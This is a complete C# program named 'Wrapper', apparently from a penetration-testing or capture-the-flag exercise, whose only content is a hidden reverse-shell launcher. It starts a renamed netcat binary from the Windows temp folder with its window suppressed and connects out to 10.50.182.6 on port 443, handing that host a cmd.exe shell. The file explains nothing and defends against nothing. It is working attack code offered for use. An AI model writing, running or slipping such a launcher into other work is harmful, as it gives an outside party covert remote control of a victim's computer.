using System;
using System.Diagnostics;

namespace Wrapper{
	class Program{
		static void Main(){
			//Main code
			Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-nairolf.exe", "10.50.182.6 443 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
			proc.Start();
		}
	}
}
